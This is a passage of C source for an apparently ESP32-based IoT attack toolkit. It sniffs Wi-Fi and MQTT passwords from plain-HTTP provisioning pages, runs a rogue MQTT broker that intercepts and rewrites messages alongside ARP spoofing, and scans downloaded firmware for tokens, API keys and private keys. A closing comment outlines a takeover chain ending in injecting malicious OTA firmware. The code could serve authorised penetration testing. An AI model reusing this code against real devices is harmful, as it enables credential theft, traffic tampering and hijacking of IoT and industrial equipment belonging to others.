    int waited = 0;
    int max_wait = (int)takeover_cfg.timeout_sec + 30;
    while (ota_attack_is_running() && waited < max_wait) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        waited++;
    }
    return (attack_state == OTA_STATE_GH_UPLOADED || attack_state == OTA_STATE_GH_WAITING_DEVICE);
}

/* ---- Get GitHub repo info JSON ---- */
const char *ota_attack_get_github_repo_json(void)
{
    static char json_buf[1024];
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "owner", current_repo.owner);
    cJSON_AddStringToObject(root, "repo", current_repo.repo);
    cJSON_AddStringToObject(root, "path", current_repo.path);
    cJSON_AddStringToObject(root, "branch", current_repo.branch);
    cJSON_AddBoolToObject(root, "token_valid", current_repo.token_valid);
    cJSON_AddBoolToObject(root, "parsed", current_repo.parsed);
    if (current_repo.file_sha[0]) cJSON_AddStringToObject(root, "file_sha", current_repo.file_sha);
    if (current_repo.token[0]) cJSON_AddBoolToObject(root, "has_token", true);
    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

/* ---- Get GitHub result JSON ---- */
const char *ota_attack_get_github_result_json(void)
{
    if (gh_result_json[0] == '\0') {
        return "{\"success\":false,\"error\":\"No GitHub operation performed\"}";
    }
    return gh_result_json;
}

/* ================================================================== */
/*  Provision Sniffer - Public API                                     */
/*  Captures ALL config creds from plain HTTP provisioning web server  */
/* ================================================================== */

const char *ota_attack_get_prov_creds_json(void)
{
    static char json_buf[8192];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < prov_cred_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "key", prov_creds[i].key);
        cJSON_AddStringToObject(item, "value", prov_creds[i].value);
        cJSON_AddStringToObject(item, "source_ip", prov_creds[i].source_ip);
        cJSON_AddBoolToObject(item, "is_sensitive", prov_creds[i].is_sensitive);
        cJSON_AddNumberToObject(item, "timestamp_ms", (double)prov_creds[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

void ota_attack_get_prov_summary(ota_prov_summary_t *out)
{
    if (out) {
        *out = prov_summary;
    }
}

const char *ota_attack_get_prov_summary_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateObject();
    if (prov_summary.wifi_ssid[0]) cJSON_AddStringToObject(root, "wifi_ssid", prov_summary.wifi_ssid);
    if (prov_summary.wifi_password[0]) cJSON_AddStringToObject(root, "wifi_password", prov_summary.wifi_password);
    if (prov_summary.mqtt_broker[0]) cJSON_AddStringToObject(root, "mqtt_broker", prov_summary.mqtt_broker);
    cJSON_AddNumberToObject(root, "mqtt_port", prov_summary.mqtt_port);
    if (prov_summary.mqtt_username[0]) cJSON_AddStringToObject(root, "mqtt_username", prov_summary.mqtt_username);
    if (prov_summary.mqtt_password[0]) cJSON_AddStringToObject(root, "mqtt_password", prov_summary.mqtt_password);
    if (prov_summary.modbus_driver_url[0]) cJSON_AddStringToObject(root, "modbus_driver_url", prov_summary.modbus_driver_url);
    if (prov_summary.custom_time[0]) cJSON_AddStringToObject(root, "custom_time", prov_summary.custom_time);
    if (prov_summary.device_id[0]) cJSON_AddStringToObject(root, "device_id", prov_summary.device_id);
    if (prov_summary.ap_password[0]) cJSON_AddStringToObject(root, "ap_password", prov_summary.ap_password);
    cJSON_AddNumberToObject(root, "total_creds_captured", prov_summary.total_creds_captured);
    cJSON_AddNumberToObject(root, "sensitive_creds_captured", prov_summary.sensitive_creds_captured);

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

uint32_t ota_attack_get_prov_cred_count(void)
{
    return (uint32_t)prov_cred_count;
}

uint32_t ota_attack_get_prov_sensitive_count(void)
{
    return prov_sensitive_count;
}

void ota_attack_clear_prov_creds(void)
{
    prov_cred_count = 0;
    prov_sensitive_count = 0;
    memset(prov_creds, 0, sizeof(prov_creds));
    memset(&prov_summary, 0, sizeof(prov_summary));
}

/* ================================================================== */
/*  Rogue Broker - Public API                                          */
/*  Full MQTT MITM — intercept, modify, forward                       */
/* ================================================================== */

const char *ota_attack_get_mitm_messages_json(void)
{
    static char json_buf[16384];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < mitm_entry_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "original_topic", mitm_entries[i].original_topic);
        cJSON_AddStringToObject(item, "original_payload", mitm_entries[i].original_payload);
        if (mitm_entries[i].was_modified) {
            cJSON_AddStringToObject(item, "modified_topic", mitm_entries[i].modified_topic);
            cJSON_AddStringToObject(item, "modified_payload", mitm_entries[i].modified_payload);
        }
        cJSON_AddBoolToObject(item, "was_modified", mitm_entries[i].was_modified);
        cJSON_AddBoolToObject(item, "direction_upload", mitm_entries[i].direction_upload);
        cJSON_AddNumberToObject(item, "timestamp_ms", (double)mitm_entries[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

void ota_attack_get_rogue_broker_summary(ota_rogue_broker_summary_t *out)
{
    if (out) {
        *out = rb_summary;
    }
}

const char *ota_attack_get_rogue_broker_summary_json(void)
{
    static char json_buf[2048];
    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "rogue_port", rb_summary.rogue_port);
    if (rb_summary.real_broker_ip[0])
        cJSON_AddStringToObject(root, "real_broker_ip", rb_summary.real_broker_ip);
    cJSON_AddNumberToObject(root, "real_broker_port", rb_summary.real_broker_port);
    cJSON_AddNumberToObject(root, "devices_connected", rb_summary.devices_connected);
    cJSON_AddNumberToObject(root, "messages_intercepted", rb_summary.messages_intercepted);
    cJSON_AddNumberToObject(root, "messages_modified", rb_summary.messages_modified);
    cJSON_AddNumberToObject(root, "messages_forwarded", rb_summary.messages_forwarded);
    cJSON_AddBoolToObject(root, "arp_spoof_active", rb_summary.arp_spoof_active);

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

bool ota_attack_set_mitm_modify_rule(const char *topic, const char *new_payload)
{
    if (!topic || !new_payload) return false;
    if (cfg.mode != OTA_MODE_ROGUE_BROKER || !running) {
        ESP_LOGW(TAG, "MITM modify rule: not in ROGUE_BROKER mode");
        return false;
    }
    strncpy(rb_active_modify_topic, topic, sizeof(rb_active_modify_topic) - 1);
    rb_active_modify_topic[sizeof(rb_active_modify_topic) - 1] = '\0';
    strncpy(rb_active_modify_payload, new_payload, sizeof(rb_active_modify_payload) - 1);
    rb_active_modify_payload[sizeof(rb_active_modify_payload) - 1] = '\0';

    /* Enable modification if we have a rule */
    cfg.rb_modify_payloads = true;

    ESP_LOGI(TAG, "ROGUE_BROKER: Set modify rule - topic='%s' payload='%s'",
             rb_active_modify_topic,
             strlen(rb_active_modify_payload) > 40 ? "(truncated)" : rb_active_modify_payload);
    return true;
}

uint32_t ota_attack_get_mitm_count(void)
{
    return mitm_count;
}

uint32_t ota_attack_get_mitm_modified_count(void)
{
    return mitm_modified_count;
}

void ota_attack_clear_mitm_messages(void)
{
    mitm_entry_count = 0;
    mitm_count = 0;
    mitm_modified_count = 0;
    mitm_forwarded_count = 0;
    memset(mitm_entries, 0, sizeof(mitm_entries));
    rb_active_modify_topic[0] = '\0';
    rb_active_modify_payload[0] = '\0';
}

/* ================================================================== */
/*  Firmware Analysis - Public API                                     */
/*  Extracts hardcoded secrets from firmware binary                    */
/* ================================================================== */

/* Internal helper: scan a binary buffer for known secret patterns */
static void scan_for_pattern(const uint8_t *data, uint32_t data_len,
                              const char *prefix, const char *type, int confidence,
                              bool is_sensitive)
{
    if (!data || data_len == 0) return;
    int prefix_len = (int)strlen(prefix);

    for (uint32_t i = 0; i < data_len - (uint32_t)prefix_len && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        if (memcmp(data + i, prefix, prefix_len) == 0) {
            /* Found a pattern - extract the value after it */
            uint32_t val_start = i + prefix_len;

            /* Skip whitespace/separators */
            while (val_start < data_len && (data[val_start] == ' ' ||
                   data[val_start] == '=' || data[val_start] == ':' ||
                   data[val_start] == '"' || data[val_start] == '\'')) {
                val_start++;
            }

            /* Extract value: printable ASCII until null, unprintable, or end */
            char value[OTA_MAX_SECRET_VALUE_LEN] = "";
            int vi = 0;
            uint32_t j = val_start;
            while (j < data_len && vi < OTA_MAX_SECRET_VALUE_LEN - 1) {
                if (data[j] >= 0x20 && data[j] < 0x7F) {
                    value[vi++] = (char)data[j++];
                } else {
                    break;
                }
            }
            value[vi] = '\0';

            /* Only store if we got a reasonable value */
            if (vi >= 4 && is_sensitive) {
                ota_fw_secret_t *secret = &fw_secrets[fw_secret_count];
                strncpy(secret->type, type, OTA_MAX_SECRET_TYPE_LEN - 1);
                strncpy(secret->value, value, OTA_MAX_SECRET_VALUE_LEN - 1);
                snprintf(secret->context, OTA_MAX_SECRET_CONTEXT_LEN, "%s%.*s",
                         prefix, vi > 30 ? 30 : vi, value);
                secret->offset = i;
                secret->confidence = confidence;

                fw_secret_count++;
                if (confidence >= 80) fw_high_confidence_count++;
                ESP_LOGI(TAG, "FW_SECRET: [%s] at offset %u: %s (confidence=%d)",
                         type, (unsigned)i,
                         is_sensitive ? "***" : value, confidence);
            }
        }
    }
}

int ota_attack_analyze_firmware(void)
{
    if (!firmware_buffer || firmware_downloaded_size == 0) {
        ESP_LOGW(TAG, "No firmware data to analyze");
        return 0;
    }

    attack_state = OTA_STATE_FW_SCANNING;
    fw_secret_count = 0;
    fw_high_confidence_count = 0;
    memset(fw_secrets, 0, sizeof(fw_secrets));
    memset(&fw_analysis_summary, 0, sizeof(fw_analysis_summary));
    fw_analysis_summary.firmware_size = firmware_downloaded_size;

    ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Scanning %u bytes for secrets",
             (unsigned)firmware_downloaded_size);

    /* ---- WiFi credential patterns ---- */
    const char *wifi_patterns[] = {
        "wifi_ssid", "ssid=", "WIFI_SSID", "WIFI_PASS",
        "wifi_password", "wifi_pass", "ap_password", "ap_pass",
        "WIFI_PASSWORD", "AP_PASSWORD", NULL
    };
    for (int i = 0; wifi_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        bool sensitive = (strstr(wifi_patterns[i], "pass") != NULL ||
                         strstr(wifi_patterns[i], "PASS") != NULL);
        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
                         wifi_patterns[i], "wifi_cred",
                         sensitive ? 90 : 70, true);
    }

    /* ---- MQTT credential patterns ---- */
    const char *mqtt_patterns[] = {
        "mqtt_broker", "mqtt_password", "mqtt_username", "mqtt_user",
        "MQTT_BROKER", "MQTT_PASSWORD", "MQTT_USERNAME", "MQTT_PASS",
        "mqtt://", "MQTT_URL", NULL
    };
    for (int i = 0; mqtt_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        bool sensitive = (strstr(mqtt_patterns[i], "pass") != NULL ||
                         strstr(mqtt_patterns[i], "PASS") != NULL);
        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
                         mqtt_patterns[i], "mqtt_cred",
                         sensitive ? 95 : 75, true);
    }

    /* ---- API key / token patterns ---- */
    const char *api_patterns[] = {
        "api_key", "API_KEY", "apikey", "ApiKey",
        "access_token", "ACCESS_TOKEN", "auth_token", "AUTH_TOKEN",
        "Bearer ", "Authorization:", "token=", "TOKEN=",
        "private_token", "PRIVATE_TOKEN", "ghp_", "gho_",
        "sk_live", "sk_test", "pk_live", "pk_test", NULL
    };
    for (int i = 0; api_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
                         api_patterns[i], "api_key", 95, true);
    }

    /* ---- Certificate / key patterns ---- */
    const char *cert_patterns[] = {
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN CERTIFICATE-----",
        "-----BEGIN PUBLIC KEY-----",
        "MIIBIjANBgkq", /* Base64 start of RSA public key */
        NULL
    };
    for (int i = 0; cert_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
                         cert_patterns[i], "certificate", 98, true);
    }

    /* ---- Hardcoded URL patterns ---- */
    const char *url_patterns[] = {
        "https://", "http://", "mqtt://", "mqtts://",
        "wss://", "ws://", "ftp://",
        NULL
    };
    for (int i = 0; url_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        /* URLs are not sensitive per se, scan them differently */
        const char *proto = url_patterns[i];
        int proto_len = (int)strlen(proto);
        for (uint32_t j = 0; j < firmware_downloaded_size - 10 && fw_secret_count < OTA_MAX_FW_SECRETS; j++) {
            if (memcmp(firmware_buffer + j, proto, proto_len) == 0) {
                char url[256] = "";
                int ui = 0;
                uint32_t k = j;
                while (k < firmware_downloaded_size && ui < 255 &&
                       firmware_buffer[k] >= 0x20 && firmware_buffer[k] < 0x7F &&
                       firmware_buffer[k] != '"' && firmware_buffer[k] != '\'' &&
                       firmware_buffer[k] != ' ' && firmware_buffer[k] != '}') {
                    url[ui++] = (char)firmware_buffer[k++];
                }
                url[ui] = '\0';
                if (ui >= 12) {
                    ota_fw_secret_t *secret = &fw_secrets[fw_secret_count];
                    strncpy(secret->type, "url", OTA_MAX_SECRET_TYPE_LEN - 1);
                    strncpy(secret->value, url, OTA_MAX_SECRET_VALUE_LEN - 1);
                    strncpy(secret->context, url, OTA_MAX_SECRET_CONTEXT_LEN - 1);
                    secret->context[OTA_MAX_SECRET_CONTEXT_LEN - 1] = '\0';
                    secret->offset = j;
                    secret->confidence = 60;
                    fw_secret_count++;
                }
                j = k; /* Skip past this URL */
            }
        }
    }

    /* ---- Modbus config patterns ---- */
    const char *modbus_patterns[] = {
        "modbus", "MODBUS", "modbus_driver", "ModbusDriver",
        "modbus_url", "MODBUS_URL", "driver_url", "DRIVER_URL",
        NULL
    };
    for (int i = 0; modbus_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
                         modbus_patterns[i], "modbus_config", 70, true);
    }

    /* Update summary */
    fw_analysis_summary.secrets_found = (uint32_t)fw_secret_count;
    fw_analysis_summary.high_confidence_count = fw_high_confidence_count;

    /* Set category flags */
    for (int i = 0; i < fw_secret_count; i++) {
        if (strcmp(fw_secrets[i].type, "wifi_cred") == 0) fw_analysis_summary.has_wifi_creds = true;
        if (strcmp(fw_secrets[i].type, "mqtt_cred") == 0) fw_analysis_summary.has_mqtt_creds = true;
        if (strcmp(fw_secrets[i].type, "api_key") == 0) fw_analysis_summary.has_api_keys = true;
        if (strcmp(fw_secrets[i].type, "certificate") == 0) {
            if (strstr(fw_secrets[i].context, "PRIVATE KEY")) fw_analysis_summary.has_private_keys = true;
            else fw_analysis_summary.has_certificates = true;
        }
        if (strcmp(fw_secrets[i].type, "url") == 0) fw_analysis_summary.has_hardcoded_urls = true;
        if (strcmp(fw_secrets[i].type, "modbus_config") == 0) fw_analysis_summary.has_modbus_config = true;
    }

    attack_state = OTA_STATE_FW_EXTRACTING;

    ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Complete - %d secrets found, %u high confidence",
             fw_secret_count, (unsigned)fw_high_confidence_count);
    ESP_LOGI(TAG, "  WiFi creds: %d, MQTT creds: %d, API keys: %d, Certs: %d, URLs: %d",
             fw_analysis_summary.has_wifi_creds, fw_analysis_summary.has_mqtt_creds,
             fw_analysis_summary.has_api_keys, fw_analysis_summary.has_certificates,
             fw_analysis_summary.has_hardcoded_urls);

    return fw_secret_count;
}

const char *ota_attack_get_fw_secrets_json(void)
{
    static char json_buf[16384];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < fw_secret_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "type", fw_secrets[i].type);
        cJSON_AddStringToObject(item, "value", fw_secrets[i].value);
        cJSON_AddStringToObject(item, "context", fw_secrets[i].context);
        cJSON_AddNumberToObject(item, "offset", fw_secrets[i].offset);
        cJSON_AddNumberToObject(item, "confidence", fw_secrets[i].confidence);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

void ota_attack_get_fw_analysis_summary(ota_fw_analysis_summary_t *out)
{
    if (out) {
        *out = fw_analysis_summary;
    }
}

const char *ota_attack_get_fw_analysis_summary_json(void)
{
    static char json_buf[2048];
    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "firmware_size", fw_analysis_summary.firmware_size);
    cJSON_AddNumberToObject(root, "secrets_found", fw_analysis_summary.secrets_found);
    cJSON_AddNumberToObject(root, "high_confidence_count", fw_analysis_summary.high_confidence_count);
    cJSON_AddBoolToObject(root, "has_wifi_creds", fw_analysis_summary.has_wifi_creds);
    cJSON_AddBoolToObject(root, "has_mqtt_creds", fw_analysis_summary.has_mqtt_creds);
    cJSON_AddBoolToObject(root, "has_api_keys", fw_analysis_summary.has_api_keys);
    cJSON_AddBoolToObject(root, "has_certificates", fw_analysis_summary.has_certificates);
    cJSON_AddBoolToObject(root, "has_private_keys", fw_analysis_summary.has_private_keys);
    cJSON_AddBoolToObject(root, "has_hardcoded_urls", fw_analysis_summary.has_hardcoded_urls);
    cJSON_AddBoolToObject(root, "has_modbus_config", fw_analysis_summary.has_modbus_config);

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return json_buf;
}

uint32_t ota_attack_get_fw_secret_count(void)
{
    return (uint32_t)fw_secret_count;
}

uint32_t ota_attack_get_fw_high_confidence_count(void)
{
    return fw_high_confidence_count;
}

void ota_attack_clear_fw_secrets(void)
{
    fw_secret_count = 0;
    fw_high_confidence_count = 0;
    memset(fw_secrets, 0, sizeof(fw_secrets));
    memset(&fw_analysis_summary, 0, sizeof(fw_analysis_summary));
}


/*
Step 1: POLL_SNIFF (Mode 4)
  └─ Discover what domains/URLs the target device contacts
  └─ Find the MQTT broker IP or OTA server
Step 2: MQTT SNIFF (Mode 0) or CLIENT (Mode 1)
  └─ Connect to the discovered MQTT broker
  └─ Capture OTA messages and firmware URLs
  └─ Extract GitHub tokens from URLs
Step 3: FIRMWARE FETCH (Mode 3)
  └─ Download the actual firmware binary
  └─ Analyze for vulnerabilities, hard-coded keys, etc.
Step 4: OTA INJECT (Mode 2) — if authorized
  └─ Craft malicious OTA message matching the expected format
  └─ Point to your own firmware binary
  └─ Inject via MQTT to take over the device
*/